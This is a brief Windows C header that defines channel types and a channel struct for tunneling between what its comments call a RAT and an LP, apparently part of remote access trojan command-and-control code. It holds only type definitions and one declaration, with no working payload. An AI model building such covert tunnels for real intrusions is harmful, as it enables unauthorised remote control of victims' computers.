#ifndef CHANNEL_H
#define CHANNEL_H

#include <Windows.h>
#include "error.h"

typedef enum _channel_type {
    CONTROL = 0,
    LOCAL_TUN,
    REMOTE_TUN
} CHANNEL_TYPE;

typedef struct _channel_t {

    BYTE bChannelType;
    WORD wRemoteChan; // Remote correspondes to the RAT
    WORD wLocalChan; // Local corresponds to the LP
    PCHAR pRemoteIP;
    PCHAR pLocalIP;
    WORD wRemotePort;
    WORD wLocalPort;
    SOCKET sock;

} CHANNEL_T;

ERROR_T ChannelCreate(VOID);

#endif // CHANNEL_H